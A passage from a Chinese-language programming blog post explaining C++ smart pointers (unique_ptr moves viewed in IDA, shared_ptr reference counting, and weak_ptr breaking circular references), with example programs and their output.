<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p1:<span class="number">0x559625bfdeb0</span></span><br><span class="line">p2:<span class="number">0x559625bfdee0</span></span><br><span class="line">-------------------</span><br><span class="line">p1:<span class="number">0</span></span><br><span class="line">p2:<span class="number">0x559625bfdeb0</span></span><br><span class="line">p3:<span class="number">0x559625bfdee0</span></span><br></pre></td></tr></table></figure>
<p>IDA 分析如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> std::allocator&lt;<span class="keyword">char</span>&gt;::<span class="built_in">allocator</span>(v27, argv, envp);</span><br><span class="line"> v23 = (<span class="keyword">void</span> *)<span class="keyword">operator</span> <span class="built_in"><span class="keyword">new</span></span>(<span class="number">0x20</span>uLL);</span><br><span class="line"> std::string::basic_string&lt;std::allocator&lt;<span class="keyword">char</span>&gt;&gt;(v23, <span class="string">&quot;11111111&quot;</span>, v27);</span><br><span class="line"> std::unique_ptr&lt;std::string&gt;::unique_ptr&lt;std::default_delete&lt;std::string&gt;,<span class="keyword">void</span>&gt;(v25, v23); <span class="comment">/* unique_ptr的构造函数 */</span></span><br><span class="line"> std::allocator&lt;<span class="keyword">char</span>&gt;::~<span class="built_in">allocator</span>(v27);</span><br><span class="line"> std::allocator&lt;<span class="keyword">char</span>&gt;::<span class="built_in">allocator</span>(v27, v23, v3);</span><br><span class="line"> v24 = (<span class="keyword">void</span> *)<span class="keyword">operator</span> <span class="built_in"><span class="keyword">new</span></span>(<span class="number">0x20</span>uLL);</span><br><span class="line"> std::string::basic_string&lt;std::allocator&lt;<span class="keyword">char</span>&gt;&gt;(v24, <span class="string">&quot;22222222&quot;</span>, v27);</span><br><span class="line"> std::unique_ptr&lt;std::string&gt;::unique_ptr&lt;std::default_delete&lt;std::string&gt;,<span class="keyword">void</span>&gt;(v26, v24); <span class="comment">/* unique_ptr的构造函数 */</span></span><br><span class="line"> std::allocator&lt;<span class="keyword">char</span>&gt;::~<span class="built_in">allocator</span>(v27);</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"> v10 = std::move&lt;std::unique_ptr&lt;std::string&gt; &amp;&gt;(v26); <span class="comment">/* 把左值转成右值 */</span></span><br><span class="line"> std::unique_ptr&lt;std::string&gt;::<span class="built_in">unique_ptr</span>(v27, v10); <span class="comment">/* unique_ptr的构造函数 */</span></span><br><span class="line"> v11 = std::move&lt;std::unique_ptr&lt;std::string&gt; &amp;&gt;(v25); <span class="comment">/* 把左值转成右值 */</span></span><br><span class="line"> std::unique_ptr&lt;std::string&gt;::<span class="keyword">operator</span>=(v26, v11);</span><br><span class="line"> </span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"> std::unique_ptr&lt;std::string&gt;::~<span class="built_in">unique_ptr</span>(v27);</span><br><span class="line"> std::unique_ptr&lt;std::string&gt;::~<span class="built_in">unique_ptr</span>(v26);</span><br><span class="line"> std::unique_ptr&lt;std::string&gt;::~<span class="built_in">unique_ptr</span>(v25)</span><br></pre></td></tr></table></figure>
<p><strong>shared_ptr</strong></p>
<p><code>shared_ptr</code> 基于非排他所有权模式：允许多个指针指向同一个资源</p>
<ul>
<li>当复制或拷贝时，引用计数加 “1”</li>
<li>当智能指针析构时，引用计数减 “1”</li>
<li>如果计数为 “0”，代表已经没有指针指向这块内存，那么就释放它</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">deleteStr</span><span class="params">(string* p)</span> </span>&#123; <span class="comment">/* 允许自定义析构函数 */</span></span><br><span class="line">    cout &lt;&lt; *p &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    string* str = <span class="keyword">new</span> <span class="built_in">string</span>(<span class="string">&quot;11111111&quot;</span>);</span><br><span class="line">    <span class="function">std::shared_ptr&lt;string&gt; <span class="title">p1</span><span class="params">(str, deleteStr)</span></span>;</span><br><span class="line">    <span class="function">std::shared_ptr&lt;string&gt; <span class="title">p2</span><span class="params">(p1)</span></span>;</span><br><span class="line">    <span class="function">std::shared_ptr&lt;string&gt; <span class="title">p3</span><span class="params">(p2)</span></span>;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;p1 count = &quot;</span> &lt;&lt; p1.<span class="built_in">use_count</span>() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;p2 count = &quot;</span> &lt;&lt; p2.<span class="built_in">use_count</span>() &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;p3 count = &quot;</span> &lt;&lt; p3.<span class="built_in">use_count</span>() &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    p1 = <span class="literal">NULL</span>;</span><br><span class="line">    p2 = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;p1 count = &quot;</span> &lt;&lt; p1.<span class="built_in">use_count</span>() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;p2 count = &quot;</span> &lt;&lt; p2.<span class="built_in">use_count</span>() &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;p3 count = &quot;</span> &lt;&lt; p3.<span class="built_in">use_count</span>() &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    p3 = <span class="literal">NULL</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;22222222&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p1 count = <span class="number">3</span></span><br><span class="line">p2 count = <span class="number">3</span></span><br><span class="line">p3 count = <span class="number">3</span></span><br><span class="line">p1 count = <span class="number">0</span> <span class="comment">/* p1被置空 */</span></span><br><span class="line">p2 count = <span class="number">0</span> <span class="comment">/* p2被置空 */</span></span><br><span class="line">p3 count = <span class="number">1</span> <span class="comment">/* shared_ptr的计数器为&quot;1&quot; */</span></span><br><span class="line"><span class="number">11111111</span> <span class="comment">/* 当shared_ptr的计数器为&quot;0&quot;时,调用析构函数 */</span></span><br><span class="line"><span class="number">22222222</span></span><br></pre></td></tr></table></figure>
<p><strong>weak_ptr</strong></p>
<p><code>weak_ptr</code> 是为配合 <code>shared_ptr</code> 而引入的一种智能指针，它只可以从一个 <code>shared_ptr</code> 或另一个 <code>weak_ptr</code> 对象构造</p>
<p><code>weak_ptr</code> 提供的是一个弱引用：</p>
<ul>
<li>弱引用不更改引用计数，类似普通指针</li>
</ul>
<p><code>shared_ptr</code> 提供的是一个强引用：</p>
<ul>
<li>当对象被创建时，计数为 “1”，每创建一个变量引用该对象时，该对象的计数就增加“1”，当上述变量销毁时，对象的计数减 “1”，当计数为 “0” 时，这个对象也就被析构了 </li>
<li>强引用计数在很多种情况下都是可以正常工作的，但是也有不凑效的时候，当出现循环引用时，就会出现严重的问题</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">parent</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">children</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> shared_ptr&lt;parent&gt; parent_ptr;</span><br><span class="line"><span class="keyword">typedef</span> shared_ptr&lt;children&gt; children_ptr;</span><br><span class="line"><span class="keyword">typedef</span> weak_ptr&lt;parent&gt; parent_ptr2;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">parent</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    ~<span class="built_in">parent</span>() &#123; std::cout &lt;&lt;<span class="string">&quot;destroying parent\n&quot;</span>; &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    children_ptr children;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">children</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    ~<span class="built_in">children</span>() &#123; std::cout &lt;&lt;<span class="string">&quot;destroying children\n&quot;</span>; &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    parent_ptr parent;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="function">parent_ptr <span class="title">father</span><span class="params">(<span class="keyword">new</span> parent())</span></span>;</span><br><span class="line">    <span class="function">children_ptr <span class="title">son</span><span class="params">(<span class="keyword">new</span> children())</span></span>;</span><br><span class="line"> </span><br><span class="line">    father-&gt;children = son;</span><br><span class="line">    son-&gt;parent = father;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;father count = &quot;</span> &lt;&lt; father.<span class="built_in">use_count</span>() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;son count = &quot;</span> &lt;&lt; son.<span class="built_in">use_count</span>() &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;begin test\n&quot;</span>;</span><br><span class="line">    <span class="built_in">test</span>();</span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;end test\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>由于 <code>parent</code> 和 <code>children</code> 对象互相引用，它们的引用计数都是 “2”，不能自动释放</li>
<li>并且此时这两个对象再无法访问到</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">begin test</span><br><span class="line">father count = <span class="number">2</span></span><br><span class="line">son count = <span class="number">2</span></span><br><span class="line">end test</span><br></pre></td></tr></table></figure>
<p>使用弱引用 <code>weak_ptr</code> 即可打破循环：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">parent</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">children</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> shared_ptr&lt;parent&gt; parent_ptr;</span><br><span class="line"><span class="keyword">typedef</span> shared_ptr&lt;children&gt; children_ptr;</span><br><span class="line"><span class="keyword">typedef</span> weak_ptr&lt;parent&gt; parent_ptr2;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">parent</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    ~<span class="built_in">parent</span>() &#123; std::cout &lt;&lt;<span class="string">&quot;destroying parent\n&quot;</span>; &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    children_ptr children;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">children</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    ~<span class="built_in">children</span>() &#123; std::cout &lt;&lt;<span class="string">&quot;destroying children\n&quot;</span>; &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    parent_ptr2 parent;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="function">parent_ptr <span class="title">father</span><span class="params">(<span class="keyword">new</span> parent())</span></span>;</span><br><span class="line">    <span class="function">children_ptr <span class="title">son</span><span class="params">(<span class="keyword">new</span> children())</span></span>;</span><br><span class="line"> </span><br><span class="line">    father-&gt;children = son;</span><br><span class="line">    son-&gt;parent = father;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;father count = &quot;</span> &lt;&lt; father.<span class="built_in">use_count</span>() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;son count = &quot;</span> &lt;&lt; son.<span class="built_in">use_count</span>() &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;begin test\n&quot;</span>;</span><br><span class="line">    <span class="built_in">test</span>();</span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;end test\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">begin test</span><br><span class="line">father count = <span class="number">1</span> <span class="comment">/* 由于children使用弱指针,因此children并不会使father的计数器增加 */</span></span><br><span class="line">son count = <span class="number">2</span></span><br><span class="line">destroying parent</span><br><span class="line">destroying children</span><br><span class="line">end test</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/34/">34</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">333</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">171</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">5m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">75:28</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
